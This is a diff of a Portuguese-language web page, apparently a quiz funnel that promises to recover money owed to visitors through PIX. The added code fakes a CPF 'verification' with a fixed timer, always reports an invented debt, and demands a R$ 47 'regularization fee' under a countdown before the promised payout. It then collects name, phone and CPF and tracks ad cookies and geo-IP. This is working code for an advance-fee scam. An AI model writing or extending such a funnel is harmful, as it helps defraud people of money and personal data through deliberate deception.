@@ -85,6 +85,74 @@
         /* Esconde a barra de rolagem mas mantém a funcionalidade */
         .cases-container::-webkit-scrollbar { display: none; }
         .cases-container { -ms-overflow-style: none; scrollbar-width: none; }
+
+        /* Estilos para o Checkout de PIX (inspirado no exemplo) */
+        .pix-code-wrapper {
+            background-color: #f3f4f6; /* gray-100 */
+            border: 1px solid #d1d5db; /* gray-300 */
+            border-radius: 8px;
+            padding: 8px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 1rem;
+        }
+        .pix-code-text {
+            flex-grow: 1;
+            font-family: monospace;
+            font-size: 0.9rem;
+            color: #374151; /* gray-700 */
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            text-align: left;
+            padding-left: 8px;
+            background: transparent;
+            border: none;
+            outline: none;
+        }
+        .copy-btn {
+            background-color: #d1d5db; /* gray-300 */
+            color: #1f2937; /* gray-800 */
+            border: none;
+            padding: 8px 12px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: 500;
+            transition: all 0.2s ease;
+            flex-shrink: 0;
+        }
+        .copy-btn:hover {
+            background-color: #9ca3af; /* gray-400 */
+        }
+        .copy-btn.copied {
+            background-color: #22c55e; /* green-500 */
+            color: white;
+        }
+        .polling-status {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            color: #4b5563; /* gray-600 */
+        }
+        .qr-code-display {
+            padding: 12px;
+            border-radius: 12px;
+            margin: 0 auto 1rem auto;
+            display: inline-block;
+            line-height: 0;
+            border: 1px solid #d1d5db; /* gray-300 */
+            background: #FFF;
+        }
+        #countdown-timer {
+            color: #ef4444; /* red-500 */
+            font-weight: 700;
+            font-size: 1.1rem;
+            margin-top: 4px;
+            display: block;
+        }
+
     </style>
 </head>
 <!-- [UX] Fundo com gradiente suave -->
@@ -375,20 +443,68 @@
                         O valor total será depositado via PIX em sua conta em até 3 dias úteis após a confirmação.
                     </p>
 
-                    <button data-next-step="step-8-form" class="w-full bg-blue-600 text-white font-bold py-4 px-6 rounded-lg text-lg hover:bg-blue-700 transition-all transform hover:scale-[1.02] active:scale-[0.98] duration-150 shadow-lg">
+                    <button data-next-step="step-8-verification" class="w-full bg-blue-600 text-white font-bold py-4 px-6 rounded-lg text-lg hover:bg-blue-700 transition-all transform hover:scale-[1.02] active:scale-[0.98] duration-150 shadow-lg">
                         Recuperar Valor Total Agora!
                     </button>
                 </div>
             </div>
 
-            <!-- ETAPA 8: Formulário Final -->
-            <div id="step-8-form" class="quiz-step">
+            <!-- [NOVA ETAPA 8] Verificação de Pendências -->
+            <div id="step-8-verification" class="quiz-step">
+                <div class="text-center flex flex-col items-center justify-center min-h-[300px]">
+                    <div class="spinner"></div>
+                    <h2 class="text-2xl font-semibold text-gray-800 mt-6">Verificação Final...</h2>
+                    <p class="text-base text-gray-600 mt-2">Cruzando seu CPF com o sistema da <strong id="verification-company-name">...</strong> para validar pendências antes da transferência.</p>
+                </div>
+            </div>
+
+            <!-- [NOVA ETAPA 9] Pagamento da Taxa -->
+            <div id="step-9-payment" class="quiz-step">
                 <div class="text-center">
-                    <h2 class="text-2xl font-semibold text-gray-800 mb-3">Última etapa!</h2>
-                    <!-- [REFORÇO DO VALOR] -->
+                    <i data-lucide="alert-triangle" class="w-16 h-16 text-red-500 mx-auto mb-4"></i>
+                    <h2 class="text-2xl font-semibold text-gray-800 mb-3">Transferência Pausada!</h2>
+                    <p class="text-base text-gray-600 mb-4">
+                        Identificamos uma <strong class="text-red-600">pendência (conta em atraso)</strong> nos últimos 12 meses em seu nome. Isso impede a transferência imediata dos valores.
+                    </p>
                     <p class="text-base text-gray-600 mb-6">
-                        Você está a um passo de recuperar <strong id="form-valor-total" class="text-blue-600 text-lg">R$ 0,00</strong>.
-                        Preencha seus dados para receber seu PIX.
+                        Para regularizar sua situação e aprovar automaticamente a transferência de <strong id="payment-total-recuperar" class="text-gray-800">R$ 0,00</strong>, pague a taxa de regularização de <strong class="text-blue-600">R$ 47,00</strong>.
+                    </p>
+                    
+                    <!-- Checkout PIX -->
+                    <div class="order-summary bg-gray-50 border border-gray-200 rounded-lg p-4 text-left mb-4">
+                        <h3 class="text-lg font-semibold text-gray-800 mb-2">Resumo da Taxa de Regularização</h3>
+                        <p class="text-gray-600 text-sm mb-2">Taxa única para liberação de pendências e aprovação da transferência.</p>
+                        <div class="text-2xl font-bold text-blue-600 text-right">R$ 47,00</div>
+                    </div>
+
+                    <div id="countdown-pix" class="bg-red-50 border border-red-200 rounded-lg p-3 mb-4 text-gray-700 text-sm">
+                        O código PIX expira em: <span id="countdown-timer" class="font-bold">10:00</span>
+                    </div>
+
+                    <div id="pix-checkout-container" class="payment-info">
+                        <div class="qr-code-display">
+                            <img id="qr-code-img" src="https://placehold.co/180x180/FFFFFF/E0E0E0?text=Gerando+QR+Code" alt="QR Code PIX">
+                        </div>
+                        <div class="pix-code-wrapper">
+                            <input id="pix-code-text" class="pix-code-text" value="Gerando seu código PIX..." readonly />
+                            <button id="copy-button" class="copy-btn">Copiar</button>
+                        </div>
+                        <div id="polling-container" class="polling-status">
+                            <div class="spinner"></div>
+                            <span>Aguardando pagamento...</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+
+            <!-- [ETAPA 10] Formulário Final (Após Pagamento) -->
+            <div id="step-10-form" class="quiz-step">
+                <div class="text-center">
+                    <i data-lucide="check-check" class="w-16 h-16 text-green-500 mx-auto mb-4"></i>
+                    <h2 class="text-2xl font-semibold text-gray-800 mb-3">Situação Regularizada!</h2>
+                    <p class="text-base text-gray-600 mb-6">
+                        Preencha seus dados para receber o valor total de <strong id="form-valor-total" class="text-blue-600 text-lg">R$ 0,00</strong>.
                     </p>
                 </div>
                 <div class="space-y-4">
@@ -406,25 +522,24 @@
                 </div>
                 
                 <!-- [UX] Mensagem de erro (substitui alert) -->
-                <p id="step-8-error" class="text-red-600 text-sm font-medium mt-3 text-left hidden"></p>
+                <p id="step-10-error" class="text-red-600 text-sm font-medium mt-3 text-left hidden"></p>
 
-                <button data-next-step="step-9-summary" data-validate-fn="validateStep8" class="w-full bg-green-500 text-white font-bold py-4 px-6 rounded-lg text-lg hover:bg-green-600 transition-all transform hover:scale-[1.02] active:scale-[0.98] duration-150 mt-6 shadow-lg">
-                    Confirmar e Recuperar <span id="button-valor-final">R$ 0,00</span>
+                <button data-next-step="step-11-summary" data-validate-fn="validateStep10" class="w-full bg-green-500 text-white font-bold py-4 px-6 rounded-lg text-lg hover:bg-green-600 transition-all transform hover:scale-[1.02] active:scale-[0.98] duration-150 mt-6 shadow-lg">
+                    Confirmar e Receber <span id="button-valor-final">R$ 0,00</span>
                 </button>
             </div>
             
-            <!-- ETAPA 9: Resumo do Pedido (Carregamento) -->
-            <div id="step-9-summary" class="quiz-step">
+            <!-- [ETAPA 11] Resumo do Pedido (Carregamento) -->
+            <div id="step-11-summary" class="quiz-step">
                 <div class="text-center flex flex-col items-center justify-center min-h-[300px]">
                     <div class="spinner"></div>
                     <h2 class="text-2xl font-semibold text-gray-800 mt-6">Enviando seu pedido...</h2>
-                    <!-- [REFORÇO DO VALOR] -->
                     <p class="text-base text-gray-600 mt-2">Estamos registrando sua solicitação de <strong id="summary-loading-valor" class="text-gray-700">R$ 0,00</strong> com segurança.</p>
                 </div>
             </div>
 
-            <!-- ETAPA 10: Comprovante de Solicitação -->
-            <div id="step-10-thanks" class="quiz-step">
+            <!-- [ETAPA 12] Comprovante de Solicitação -->
+            <div id="step-12-thanks" class="quiz-step">
                 <div class="text-center">
                     <i data-lucide="party-popper" class="w-16 h-16 text-green-500 mx-auto mb-4"></i>
                     <h2 class="text-2xl font-semibold text-gray-800 mb-3">Solicitação Registrada!</h2>
@@ -534,6 +649,12 @@
                 fbp: null,      // <-- [HOTTRACK] Cookie _fbp
                 fbc: null       // <-- [HOTTRACK] Cookie _fbc
             },
+            payment: {
+                transaction_id: null,
+                pix_code: null,
+                polling_interval: null,
+                countdown_interval: null,
+            },
             quizData: {
                 company: null,
                 address_cep: null,
@@ -615,7 +736,10 @@
                 // 6. Esconde (display: none) a etapa anterior BEM DEPOIS da transição acabar
                 if (stepToHide) {
                     setTimeout(() => {
-                        stepToHide.style.display = 'none';
+                        // Só esconde se não for a mesma etapa (evita piscar)
+                        if (stepToHide.id !== nextStepElement.id) {
+                            stepToHide.style.display = 'none';
+                        }
                     }, 400); // Duração da transição de opacidade
                 }
                 
@@ -737,13 +861,30 @@
                     adjustContainerHeight(document.getElementById(stepId));
                     break;
 
-                case 'step-8-form':
+                // [NOVA ETAPA 8]
+                case 'step-8-verification':
+                    document.getElementById('verification-company-name').innerText = quizState.quizData.company;
+                    // Simula a verificação
+                    setTimeout(() => {
+                        showStep('step-9-payment');
+                    }, 3000);
+                    break;
+                
+                // [NOVA ETAPA 9]
+                case 'step-9-payment':
+                    // Preenche o valor a recuperar na copy
+                    document.getElementById('payment-total-recuperar').innerText = `R$ ${quizState.results.total_final.toFixed(2)}`;
+                    // Inicia o checkout
+                    generateCheckoutPix();
+                    break;
+
+                case 'step-10-form':
                     const totalStr = `R$ ${quizState.results.total_final.toFixed(2)}`;
                     document.getElementById('form-valor-total').innerText = totalStr;
                     document.getElementById('button-valor-final').innerText = totalStr; 
                     break;
 
-                case 'step-9-summary':
+                case 'step-11-summary':
                     quizState.quizData.form_nome = document.getElementById('form-nome').value;
                     quizState.quizData.form_numero = document.getElementById('form-numero').value;
                     quizState.quizData.form_cpf = document.getElementById('form-cpf').value;
@@ -766,16 +907,17 @@
                         fbp: quizState.meta.fbp, 
                         fbc: quizState.meta.fbc, 
                         geo: quizState.geo,
-                        total_recuperar: quizState.results.total_final 
+                        total_recuperar: quizState.results.total_final,
+                        pagou_taxa: 47.00 // Indica que a taxa foi paga
                     }, null, 2));
                     console.log("---------------------------------");
                     
                     setTimeout(() => {
-                        showStep('step-10-thanks');
+                        showStep('step-12-thanks');
                     }, 3000); 
                     break;
                 
-                case 'step-10-thanks':
+                case 'step-12-thanks':
                     document.getElementById('thanks-whatsapp').innerText = quizState.quizData.form_numero;
                     document.getElementById('summary-nome').innerText = quizState.quizData.form_nome;
                     document.getElementById('summary-cpf').innerText = `CPF: ${quizState.quizData.form_cpf}`;
@@ -855,7 +997,6 @@
                 adjustContainerHeight(currentVisibleStep);
                 return false;
             }
-            // Valida se os valores manuais são números válidos se foram preenchidos
             if (!file && (isNaN(parseFloat(v1)) || isNaN(parseFloat(v2)) || isNaN(parseFloat(v3)))) {
                  errorEl.innerText = "Por favor, insira valores numéricos válidos para os meses.";
                 errorEl.classList.remove('hidden');
@@ -889,9 +1030,10 @@
             return true;
         }
 
-        function validateStep8() {
+        // Renomeada para Etapa 10
+        function validateStep10() {
             clearAllErrors();
-            const errorEl = document.getElementById('step-8-error');
+            const errorEl = document.getElementById('step-10-error'); // Busca o erro da etapa 10
             if (document.getElementById('form-nome').value.length < 3) {
                 errorEl.innerText = "Por favor, preencha seu Nome Completo.";
                 errorEl.classList.remove('hidden');
@@ -925,19 +1067,128 @@
             return true;
         }
 
-        // --- INICIALIZAÇÃO DO QUIZ (COM GERAÇÃO DE CLICK ID SE NECESSÁRIO) ---
+        // --- LÓGICA DE CHECKOUT (ETAPA 9) ---
+
+        function startCheckoutTimer() {
+            let duration = 10 * 60; // 10 minutos
+            const timerElement = document.getElementById('countdown-timer');
+            if (quizState.payment.countdown_interval) clearInterval(quizState.payment.countdown_interval);
+
+            quizState.payment.countdown_interval = setInterval(() => {
+                const minutes = Math.floor(duration / 60).toString().padStart(2, '0');
+                const seconds = (duration % 60).toString().padStart(2, '0');
+                timerElement.textContent = `${minutes}:${seconds}`;
+
+                if (--duration < 0) {
+                    clearInterval(quizState.payment.countdown_interval);
+                    timerElement.textContent = "EXPIRADO";
+                    document.getElementById('polling-container').innerHTML = `<span class="text-red-500 font-bold">Seu PIX expirou. Por favor, atualize a página e tente novamente.</span>`;
+                    stopPolling();
+                }
+            }, 1000);
+        }
+
+        async function generateCheckoutPix() {
+            const valueCents = 4700; // R$ 47,00
+            const pixCodeEl = document.getElementById('pix-code-text');
+            const qrCodeImgEl = document.getElementById('qr-code-img');
+
+            try {
+                if (!quizState.meta.click_id) {
+                    throw new Error("Sessão inválida. click_id não encontrado. Atualize a página.");
+                }
+
+                const pixResponse = await fetch(`${API_BASE_URL}/api/pix/generate`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json', 'x-api-key': SELLER_API_KEY },
+                    body: JSON.stringify({ click_id: quizState.meta.click_id, value_cents: valueCents })
+                });
+                
+                if (!pixResponse.ok) {
+                    const errorData = await pixResponse.json();
+                    throw new Error(errorData.message || 'Não foi possível gerar seu código PIX.');
+                }
+                
+                const pixData = await pixResponse.json();
+                quizState.payment.transaction_id = pixData.transaction_id;
+                quizState.payment.pix_code = pixData.qr_code_text;
+
+                if (pixData.qr_code_base64) {
+                    qrCodeImgEl.src = `data:image/png;base64,${pixData.qr_code_base64}`;
+                } else {
+                     qrCodeImgEl.src = "https://placehold.co/180x180/FFFFFF/E0E0E0?text=Escaneie+no+App";
+                }
+                
+                pixCodeEl.value = pixData.qr_code_text;
+                startCheckoutTimer();
+                startPolling();
+
+            } catch (error) {
+                console.error('Erro no generateCheckoutPix:', error);
+                document.getElementById('pix-checkout-container').innerHTML = `<p class="text-red-600 font-bold text-center">Erro ao gerar PIX: ${error.message}. Por favor, atualize a página.</p>`;
+            }
+        }
+
+        function startPolling() {
+            if (quizState.payment.polling_interval) clearInterval(quizState.payment.polling_interval);
+            
+            // Verifica imediatamente
+            checkPaymentStatus(); 
+            
+            // E depois a cada 5 segundos
+            quizState.payment.polling_interval = setInterval(checkPaymentStatus, 5000); 
+        }
+
+        function stopPolling() {
+            if (quizState.payment.polling_interval) {
+                clearInterval(quizState.payment.polling_interval);
+                quizState.payment.polling_interval = null;
+            }
+        }
+
+        async function checkPaymentStatus() {
+            if (!quizState.payment.transaction_id) return;
+            
+            try {
+                const response = await fetch(`${API_BASE_URL}/api/pix/status/${quizState.payment.transaction_id}`, { 
+                    headers: { 'x-api-key': SELLER_API_KEY } 
+                });
+                
+                if (!response.ok) {
+                    console.warn(`Erro ao verificar status: ${response.status}`);
+                    return;
+                }
+
+                const data = await response.json();
+                
+                if (data.status === 'paid') {
+                    stopPolling();
+                    if (quizState.payment.countdown_interval) clearInterval(quizState.payment.countdown_interval);
+                    
+                    // Dispara evento do Facebook Pixel para a taxa
+                    // if (typeof fbq === 'function') {
+                    //    fbq('track', 'Purchase', {value: 47.00, currency: 'BRL'});
+                    // }
+                    
+                    // Avança para a próxima etapa (formulário)
+                    showStep('step-10-form');
+                }
+                // Se não estiver pago, não faz nada e espera a próxima verificação
+                
+            } catch (error) { 
+                console.error('Erro ao verificar status do pagamento:', error); 
+            }
+        }
+
+        // --- INICIALIZAÇÃO DO QUIZ ---
         
         async function initializeQuiz() {
             const loadingScreen = document.getElementById('loading-screen');
             const quizContainer = document.getElementById('quiz-container');
-            let geoDataFetched = false; // Flag para saber se conseguimos dados de GeoIP
+            let geoDataFetched = false; 
 
             try {
-                // 1. Rastrear Pixel do Meta (se necessário)
-                // fbq('init', 'SEU_PIXEL_ID');
-                // fbq('track', 'PageView');
-
-                // 2. Coletar UTMs, fbclid, fbp, fbc da URL e Cookies
+                // 1. Coletar UTMs, fbclid, fbp, fbc
                 const params = new URLSearchParams(window.location.search);
                 quizState.utm.source = params.get("utm_source");
                 quizState.utm.campaign = params.get("utm_campaign");
@@ -945,14 +1196,13 @@
                 quizState.utm.content = params.get("utm_content");
                 quizState.utm.term = params.get("utm_term");
                 quizState.meta.fbclid = params.get("fbclid");
-                quizState.meta.fbp = getCookie("_fbp"); // Pega cookie _fbp
-                quizState.meta.fbc = getCookie("_fbc"); // Pega cookie _fbc
+                quizState.meta.fbp = getCookie("_fbp");
+                quizState.meta.fbc = getCookie("_fbc");
                 
-                // 3. [HOTTRACK] Buscar/Gerar Click ID e obter Geo-IP
+                // 2. [HOTTRACK] Buscar/Gerar Click ID e obter Geo-IP
                 let click_id_to_use = params.get("click_id");
                 
                 if (click_id_to_use) {
-                    // Já temos um click_id, busca info no backend
                     quizState.meta.click_id = click_id_to_use; 
                     console.log(`[HotTrack] Usando click_id da URL: ${click_id_to_use}. Buscando Geo-IP...`);
                     try {
@@ -966,16 +1216,15 @@
                             if (data.status === 'success' && data.city && data.state) {
                                 quizState.geo.city = data.city;
                                 quizState.geo.region = data.state; 
-                                quizState.geo.regionCode = data.state; // Assumindo nome completo
+                                quizState.geo.regionCode = data.state;
                                 console.log(`[HotTrack] Sucesso! Geo-IP: ${data.city}, ${data.state}`);
                                 geoDataFetched = true;
                             } else { throw new Error(data.message || "Backend não retornou cidade/estado"); }
                         } else { throw new Error(`API click/info respondeu com status ${response.status}`); }
                     } catch (hottrackError) {
-                        console.warn("[HotTrack] Falha ao buscar Geo-IP do backend (usando click_id existente):", hottrackError.message);
+                        console.warn("[HotTrack] Falha ao buscar Geo-IP (click_id existente):", hottrackError.message);
                     }
                 } else {
-                    // Não temos click_id, precisamos registrar um novo
                     console.log("[HotTrack] Nenhum click_id na URL. Registrando novo clique...");
                     try {
                         const registerResponse = await fetch(`${API_BASE_URL}/api/registerClick`, {
@@ -983,7 +1232,7 @@
                             headers: { "Content-Type": "application/json" },
                             body: JSON.stringify({
                                 sellerApiKey: SELLER_API_KEY,
-                                presselId: DEFAULT_PRESSEL_ID, // Usa o ID padrão
+                                presselId: DEFAULT_PRESSEL_ID,
                                 referer: document.referrer || null,
                                 fbclid: quizState.meta.fbclid,
                                 fbp: quizState.meta.fbp,
@@ -999,10 +1248,10 @@
                         if (registerResponse.ok) {
                             const registerData = await registerResponse.json();
                             if (registerData.status === "success" && registerData.click_id) {
-                                click_id_to_use = registerData.click_id; // Guarda o novo click_id
+                                click_id_to_use = registerData.click_id; 
                                 quizState.meta.click_id = click_id_to_use;
                                 console.log(`[HotTrack] Novo click_id registrado: ${click_id_to_use}. Buscando Geo-IP...`);
-                                // Tenta buscar a cidade/estado com o novo click_id
+                                
                                 const infoResponse = await fetch(`${API_BASE_URL}/api/click/info`, {
                                     method: 'POST',
                                     headers: { 'Content-Type': 'application/json', 'x-api-key': SELLER_API_KEY },
@@ -1025,19 +1274,19 @@
                     }
                 }
 
-                // 4. [FALLBACK IPINFO] Se o HotTrack falhou ou não conseguiu dados
+                // 3. [FALLBACK IPINFO]
                 if (!geoDataFetched) {
                     console.log("[Fallback] Tentando buscar Geo-IP diretamente com ipinfo.io");
                     try {
                         if (!IPINFO_TOKEN || IPINFO_TOKEN === "SEU_TOKEN_GRATUITO_IPINFO") {
-                           console.warn("[Fallback] Token do ipinfo.io não configurado. Busca de cidade via IP direto não funcionará. Registre-se em ipinfo.io para obter um token gratuito.");
+                           console.warn("[Fallback] Token do ipinfo.io não configurado. Busca de cidade via IP direto não funcionará.");
                         } else {
                             const response = await fetch(`https://ipinfo.io/json?token=${IPINFO_TOKEN}`);
                             const data = await response.json();
                             if (data.city && data.region) {
                                 quizState.geo.city = data.city;
                                 quizState.geo.region = data.region; 
-                                quizState.geo.regionCode = data.region; // Usa nome completo como fallback
+                                quizState.geo.regionCode = data.region;
                                 console.log(`[Fallback] Sucesso! Geo-IP via ipinfo.io: ${data.city}, ${data.region}`);
                                 geoDataFetched = true;
                             } else {
@@ -1052,7 +1301,7 @@
             } catch (error) {
                 console.error("Erro geral na inicialização:", error);
             } finally {
-                // 5. Iniciar o Quiz
+                // 4. Iniciar o Quiz
                 
                 // Atualiza os placeholders de cidade na interface
                 document.getElementById('geo-city-1').innerText = quizState.geo.city;
@@ -1096,6 +1345,41 @@
                     quizState.quizData.fatura_file = this.files[0];
                 });
 
+                // Adiciona listener do botão de copiar PIX
+                document.getElementById('copy-button').addEventListener('click', () => {
+                    const pixCodeEl = document.getElementById('pix-code-text');
+                    if (pixCodeEl.value && pixCodeEl.value !== "Gerando seu código PIX...") {
+                        // Tenta usar a API de Clipboard moderna
+                        if (navigator.clipboard && navigator.clipboard.writeText) {
+                            navigator.clipboard.writeText(pixCodeEl.value).then(() => {
+                                document.getElementById('copy-button').textContent = 'Copiado!';
+                                document.getElementById('copy-button').classList.add('copied');
+                                setTimeout(() => {
+                                    document.getElementById('copy-button').textContent = 'Copiar';
+                                    document.getElementById('copy-button').classList.remove('copied');
+                                }, 2000);
+                            }).catch(err => {
+                                console.warn('Falha ao copiar com navigator.clipboard:', err);
+                            });
+                        } else {
+                            // Fallback para document.execCommand (pode falhar em HTTPS)
+                            try {
+                                pixCodeEl.select();
+                                document.execCommand('copy');
+                                document.getElementById('copy-button').textContent = 'Copiado!';
+                                document.getElementById('copy-button').classList.add('copied');
+                                setTimeout(() => {
+                                    document.getElementById('copy-button').textContent = 'Copiar';
+                                    document.getElementById('copy-button').classList.remove('copied');
+                                }, 2000);
+                            } catch (err) {
+                                console.error('Falha ao copiar com execCommand:', err);
+                                alert("Não foi possível copiar automaticamente. Selecione e copie manualmente.");
+                            }
+                        }
+                    }
+                });
+
                 // Finalmente, mostra a primeira etapa
                 if (document.getElementById('step-0-welcome')) {
                     showStep('step-0-welcome');
@@ -1110,3 +1394,4 @@
     </script>
 </body>
 </html>
+
